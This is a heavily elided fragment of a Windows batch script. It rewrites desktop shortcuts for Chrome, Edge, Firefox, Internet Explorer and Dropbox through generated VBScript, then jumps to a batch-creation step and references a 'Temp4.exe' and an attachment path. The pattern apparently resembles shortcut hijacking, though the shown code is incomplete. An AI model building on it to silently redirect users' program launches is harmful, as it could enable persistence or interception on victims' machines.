...
if exist "%USERPROFILE%\Desktop\Chrome.lnk" (
	...
	if exist "%ProgramFiles(x86)%" (
		...
		echo Set TempPath= "%ProgramFiles(x86)%\Google\Chrome\Application\"
	) else (
		echo oLink.TargetPath = "%ProgramFiles%\Google\Chrome\Application\chrome.exe" >> %SCRIPT%
		echo Set TempPath= "%ProgramFiles%\Google\Chrome\Application\"
	)
	...
	if exist "%ProgramFiles(x86)%" (
		...
		echo Set TempPath= "%ProgramFiles(x86)%\Microsoft\Edge\Application\"
	) else (
		echo oLink.TargetPath = "%ProgramFiles%\Microsoft\Edge\Application\msedge.exe" >> %SCRIPT%
		echo Set TempPath= "%ProgramFiles%\Microsoft\Edge\Application\"
	)
	echo oLink.Save >> %SCRIPT%
	cscript /nologo %SCRIPT%
	goto CreateBatch
	...
	if exist "%ProgramFiles(x86)%" (
		...
		echo Set TempPath= "%ProgramFiles(x86)%\Mozilla Firefox\"
	) else (
		echo oLink.TargetPath = "%ProgramFiles%\Mozilla Firefox\firefox.exe" >> %SCRIPT%
		echo Set TempPath= "%ProgramFiles%\Mozilla Firefox\"
	)
	echo oLink.Save >> %SCRIPT%
	cscript /nologo %SCRIPT%
	goto CreateBatch
	...
	if exist "%ProgramFiles(x86)%" (
		...
		echo Set TempPath= "%ProgramFiles(x86)%\Internet Explorer\"
	) else (
		echo oLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" >> %SCRIPT%
		echo Set TempPath= "%ProgramFiles%\Internet Explorer\"
	)
	echo oLink.Save >> %SCRIPT%
	cscript /nologo %SCRIPT%
	goto CreateBatch
	...
	if exist "%ProgramFiles(x86)%" (
		...
		echo Set TempPath= "%ProgramFiles(x86)%\Dropbox\Client\"
	) else (
		echo oLink.TargetPath = "%ProgramFiles%\Dropbox\Client\Dropbox.exe" >> %SCRIPT%
		echo Set TempPath= "%ProgramFiles%\Dropbox\Client\"
	)
	echo oLink.Save >> %SCRIPT%
	cscript /nologo %SCRIPT%
	goto CreateBatch
...
if exist "Temp4.exe" (
	...
	set fileattach="c:\Desktop\arguments.txt"
